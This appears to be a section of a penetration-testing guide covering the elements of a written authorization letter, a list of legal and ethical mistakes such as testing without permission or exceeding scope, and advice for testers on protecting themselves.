Authorization Letter

Key Authorization Elements
1. Written authorization from system owner
2. Specific scope definition (IP ranges, domains)
3. Named authorized testers
4. Duration of authorization
5. Emergency contact information
6. Signed by legal authority (CISO, CTO, CEO)
7. Kept on file for legal protection
8. Updated if scope changes during engagement

▶Career-Destroying Mistakes
Fatal Mistakes to Avoid

1. Testing without authorization — Even "checking if a site is vulnerable" is a crime
2. Exceeding scope — Testing systems not in the ROE, even if found during testing
3. Accessing user data — Viewing personal information beyond what's needed
4. Bragging about findings — Disclosing vulnerabilities on social media
5. Selling exploits — Without proper legal framework and authorization
6. Deleting evidence — Destroying logs or evidence of your testing
7. Keeping access — Maintaining backdoor access after engagement ends
8. Ignoring scope changes — Testing new systems without updated authorization
9. Social engineering without consent — Phishing employees without explicit permission
10. Running DoS attacks — Without explicit authorization and safety measures

Protect Yourself

• Always have written authorization before testing
• Keep copies of all engagement documents
• Use a separate testing environment when possible
• Consult a lawyer if unsure about legality
• Join professional organizations (ISC2, ISACA) for ethics guidance
• When in doubt, stop and ask the client
